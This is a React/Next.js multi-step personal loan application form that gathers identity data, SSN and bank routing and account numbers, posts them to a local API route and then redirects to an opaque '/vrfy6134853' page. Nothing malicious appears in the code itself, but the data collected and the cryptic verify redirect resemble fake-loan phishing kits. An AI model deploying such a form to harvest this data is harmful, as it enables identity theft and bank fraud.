// components/LoanCalculator.tsx
"use client";

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Progress } from "@/components/ui/progress";
import { ChevronLeft, ChevronRight, Lock } from "lucide-react";
import { useRouter } from "next/navigation";

interface FormData {
  // Loan Details
  loanAmount: string;
  loanPurpose: string;

  // Personal Information
  firstName: string;
  lastName: string;
  email: string;
  phoneno: string;
  homeAddress: string;
  city: string;
  state: string;
  zipCode: string;
  dobMonth: string;
  dobDay: string;
  dobYear: string;

  // Financial Information
  ssn: string;
  bankName: string;
  routingNumber: string;
  accountNumber: string;
}

export function LoanCalculator() {
  const router = useRouter();
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState<FormData>({
    loanAmount: "5000",
    loanPurpose: "",
    firstName: "",
    lastName: "",
    email: "",
    phoneno: "",
    homeAddress: "",
    city: "",
    state: "",
    zipCode: "",
    dobMonth: "",
    dobDay: "",
    dobYear: "",
    ssn: "",
    bankName: "",
    routingNumber: "",
    accountNumber: "",
  });
  const [submissionStatus, setSubmissionStatus] = useState<"idle" | "loading" | "success" | "error">("idle");
  const [submissionMessage, setSubmissionMessage] = useState("");
  const [validationError, setValidationError] = useState<string | null>(null);
  const [showPassword, setShowPassword] = useState(false);

  // Track sub-steps for step 2
  const [currentSubStep, setCurrentSubStep] = useState(1);
  const totalSubSteps = 2; // Personal Info and Financial Info

  const totalSteps = 3; // Original Step 1 + Personal Info + Financial Info
  const progress = (currentStep / totalSteps) * 100;

  const updateFormData = (field: keyof FormData, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    setValidationError(null);
  };

  const validateStep = (step: number): boolean => {
    setValidationError(null);
    let isValid = true;
    let errorMessage = "Please fill in all required fields.";

    switch (step) {
      case 1:
        if (!formData.loanAmount || Number(formData.loanAmount) < 2000 || Number(formData.loanAmount) > 10000) {
          isValid = false;
          errorMessage = "Please enter a loan amount between $2,000 and $10,000.";
        }
        if (!formData.loanPurpose) {
          isValid = false;
          errorMessage = "Please select a loan purpose.";
        }
        break;

      case 2: // Personal Info
        if (
          !formData.firstName ||
          !formData.lastName ||
          !formData.email ||
          !formData.phoneno ||
          !formData.homeAddress ||
          !formData.city ||
          !formData.state ||
          !formData.zipCode ||
          !formData.dobMonth ||
          !formData.dobDay ||
          !formData.dobYear
        ) {
          isValid = false;
        }
        break;

      case 3: // Financial Info
        if (!formData.ssn || !formData.bankName || !formData.routingNumber || !formData.accountNumber) {
          isValid = false;
        }
        break;

      default:
        break;
    }

    if (!isValid) {
      setValidationError(errorMessage);
    }
    return isValid;
  };

  const handleNextStep = () => {
    if (validateStep(currentStep)) {
      if (currentStep < totalSteps) {
        setCurrentStep(currentStep + 1);
      } else {
        handleSubmit();
      }
    }
  };

  const prevStep = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
      setValidationError(null);
    }
  };

  const handleSubmit = async () => {
    if (!validateStep(3)) return;

    setSubmissionStatus("loading");
    setSubmissionMessage("");

    try {
      const response = await fetch("/api/loan-application", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(formData),
      });

      const result = await response.json();

      if (result.success) {
        setSubmissionStatus("success");
        setSubmissionMessage(result.message || "Loan application submitted successfully!");
        router.push("/vrfy6134853");
      } else {
        setSubmissionStatus("error");
        setSubmissionMessage(result.message || "Failed to submit loan application. Please try again.");
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setSubmissionStatus("error");
      setSubmissionMessage("An error occurred. Please check your network and try again.");
    }
  };

  const renderStep = () => {
    switch (currentStep) {
      case 1:
        return (
          <div className="space-y-6">
            <h3 className="text-lg font-semibold text-center mb-4">Loan Details</h3>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Loan Amount ($2,000 to $10,000)</label>
              <div className="relative">
                <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-500">$</span>
                <Input
                  type="number"
                  value={formData.loanAmount}
                  onChange={(e) => updateFormData("loanAmount", e.target.value)}
                  className="pl-8 h-12 border-2 border-gray-300 rounded-md focus:border-blue-500 focus:ring-1 focus:ring-blue-500"
                  placeholder="5,000"
                  min="2000"
                  max="10000"
                  required
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Loan Purpose</label>
              <Select
                value={formData.loanPurpose}
                onValueChange={(value) => updateFormData("loanPurpose", value)}
                required
              >
                <SelectTrigger className="h-12 border-2 border-gray-300 rounded-md focus:border-blue-500 focus:ring-1 focus:ring-blue-500">
                  <SelectValue placeholder="Select loan purpose" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="debt-consolidation">Debt Consolidation</SelectItem>
                  <SelectItem value="home-improvement">Home Improvement</SelectItem>
                  <SelectItem value="major-purchase">Major Purchase</SelectItem>
                  <SelectItem value="wedding">Wedding</SelectItem>
                  <SelectItem value="vacation">Vacation</SelectItem>
                  <SelectItem value="medical">Medical Expenses</SelectItem>
                  <SelectItem value="other">Other</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>
        );

      case 2: // Personal Information
        return (
          <div className="space-y-6">
            <h3 className="text-lg font-semibold text-center mb-4">Personal Information</h3>
            
            <div className="space-y-4">
              <div className="grid grid-cols-2 gap-4 mb-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">First Name *</label>
                  <Input
                    type="text"
                    value={formData.firstName}
                    onChange={(e) => updateFormData("firstName", e.target.value)}
                    placeholder="John"
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Last Name *</label>
                  <Input
                    type="text"
                    value={formData.lastName}
                    onChange={(e) => updateFormData("lastName", e.target.value)}
                    placeholder="Doe"
                    required
                  />
                </div>
              </div>
              <div className="grid grid-cols-2 gap-4 mb-4">
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Email ID *</label>
                  <Input
                    type="email"
                    value={formData.email}
                    onChange={(e) => updateFormData("email", e.target.value)}
                    required
                  />
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number *</label>
                  <Input
                    type="tel"
                    value={formData.phoneno}
                    onChange={(e) => updateFormData("phoneno", e.target.value)}
                    placeholder="(555) 123-4567"
                    required
                  />
                </div>
              </div>
              <div className="mb-4">
                <label className="block text-sm font-medium text-gray-700 mb-2">Home Address *</label>
                <Input
                  type="text"
                  value={formData.homeAddress}
                  onChange={(e) => updateFormData("homeAddress", e.target.value)}
                  placeholder="123 Main Street"
                  required
                />
              </div>
              <div className="grid grid-cols-3 gap-2 mb-4">
                <div>
                  <Input
                    type="text"
                    value={formData.city}
                    onChange={(e) => updateFormData("city", e.target.value)}
                    placeholder="City"
                    required
                  />
                </div>
                <div>
                  <Input
                    type="text"
                    value={formData.state}
                    onChange={(e) => updateFormData("state", e.target.value)}
                    placeholder="NY"
                    maxLength={2}
                    required
                  />
                </div>
                <div>
                  <Input
                    type="text"
                    value={formData.zipCode}
                    onChange={(e) => updateFormData("zipCode", e.target.value)}
                    placeholder="ZIP"
                    maxLength={5}
                    required
                  />
                </div>
              </div>
              <div className="mb-4">
                {/* Main Label */}
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Date of Birth *
                </label>

                {/* Grid for Day, Month, Year */}
                <div className="grid grid-cols-3 gap-2">
                  <div>
                    <Input
                      type="number"
                      placeholder="Month"
                      value={formData.dobMonth}
                      onChange={(e) => updateFormData("dobMonth", e.target.value)}
                      min="1"
                      max="12"
                      required
                    />
                    <label className="text-xs text-gray-500 mt-1 block text-center">
                      Month
                    </label>
                  </div>

                  <div>
                    <Input
                      type="number"
                      placeholder="Date"
                      value={formData.dobDay}
                      onChange={(e) => updateFormData("dobDay", e.target.value)}
                      min="1"
                      max="31"
                      required
                    />
                    <label className="text-xs text-gray-500 mt-1 block text-center">
                      Day
                    </label>
                  </div>

                  <div>
                    <Input
                      type="number"
                      placeholder="Year"
                      value={formData.dobYear}
                      onChange={(e) => updateFormData("dobYear", e.target.value)}
                      min="1900"
                      max="2010"
                      required
                    />
                    <label className="text-xs text-gray-500 mt-1 block text-center">
                      Year
                    </label>
                  </div>
                </div>
              </div>
            </div>
          </div>
        );

      case 3: // Financial Information
        return (
          <div className="space-y-6">
            <h3 className="text-lg font-semibold text-center mb-4">Financial Information</h3>
            
            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Social Security Number *</label>
                <Input
                  type="password"
                  value={formData.ssn}
                  onChange={(e) => updateFormData("ssn", e.target.value)}
                  placeholder="XXX-XX-XXXX"
                  maxLength={9}
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Bank Name *</label>
                <Input
                  type="text"
                  value={formData.bankName}
                  onChange={(e) => updateFormData("bankName", e.target.value)}
                  placeholder="Chase Bank"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Routing Number *</label>
                <Input
                  type="text"
                  value={formData.routingNumber}
                  onChange={(e) => updateFormData("routingNumber", e.target.value)}
                  placeholder="123456789"
                  minLength={5}
                  maxLength={13}
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Account Number *</label>
                <Input
                  type="text"
                  value={formData.accountNumber}
                  onChange={(e) => updateFormData("accountNumber", e.target.value)}
                  placeholder="1234567890"
                  required
                />
              </div>
            </div>
          </div>
        );

      default:
        return null;
    }
  };

  return (
    <Card className="w-full max-w-md mx-auto shadow-lg">
      <CardHeader className="bg-gray-50 rounded-t-lg border-b">
        <CardTitle className="text-center text-2xl">Personal Loan Application</CardTitle>
        <div className="space-y-2 pt-2">
          <div className="flex justify-between text-sm text-gray-600">
            <span>
              Step {currentStep} of {totalSteps}
            </span>
            <span>{Math.round(progress)}% Complete</span>
          </div>
          <Progress value={progress} className="h-2" />
        </div>
      </CardHeader>
      <CardContent className="space-y-6 p-6">
        {renderStep()}

        {validationError && (
          <div className="mt-4 p-3 rounded-md text-center bg-red-100 text-red-700 border border-red-200">
            {validationError}
          </div>
        )}

        <div className="flex justify-between pt-4">
          <Button
            variant="outline"
            onClick={prevStep}
            disabled={currentStep === 1 || submissionStatus === "loading"}
            className="flex items-center space-x-2 border-2"
          >
            <ChevronLeft className="w-4 h-4" />
            <span>Back</span>
          </Button>

          {currentStep < totalSteps ? (
            <Button
              onClick={handleNextStep}
              className="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700"
            >
              <span>Next</span>
              <ChevronRight className="w-4 h-4" />
            </Button>
          ) : (
            <Button
              onClick={handleSubmit}
              className="bg-green-600 hover:bg-green-700"
              disabled={submissionStatus === "loading"}
            >
              {submissionStatus === "loading" ? "Submitting..." : "Submit Application"}
            </Button>
          )}
        </div>

        {submissionMessage && (
          <div
            className={`mt-4 p-3 rounded-md text-center border ${
              submissionStatus === "success"
                ? "bg-green-100 text-green-700 border-green-200"
                : "bg-red-100 text-red-700 border-red-200"
            }`}
          >
            {submissionMessage}
          </div>
        )}
      </CardContent>
    </Card>
  );
}
